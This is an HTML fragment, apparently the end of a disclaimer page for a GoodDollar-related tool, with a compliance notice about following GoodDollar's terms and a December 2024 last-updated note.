                <h3 style="color: #333; margin-bottom: 15px; font-size: 16px;">GoodDollar Compliance:</h3>
                <p style="color: #666;">
                    By using this tool, you agree to comply with all GoodDollar terms of service and rules. This tool is designed to assist verified users, not to circumvent GoodDollar's eligibility or verification requirements. Violation of GoodDollar's terms may result in account suspension.
                </p>
            </div>

            <div style="background: #e8f5e9; border-left: 4px solid #4caf50; border-radius: 6px; padding: 20px; margin-top: 25px;">
                <strong style="color: #2e7d32; font-size: 14px;">Last Updated: December 2024</strong>
                <p style="color: #333; margin-top: 10px; font-size: 13px;">
                    This disclaimer may be updated at any time without notice. Please check back regularly for updates.
                </p>
            </div>
        </div>
    </div>
</body></html>
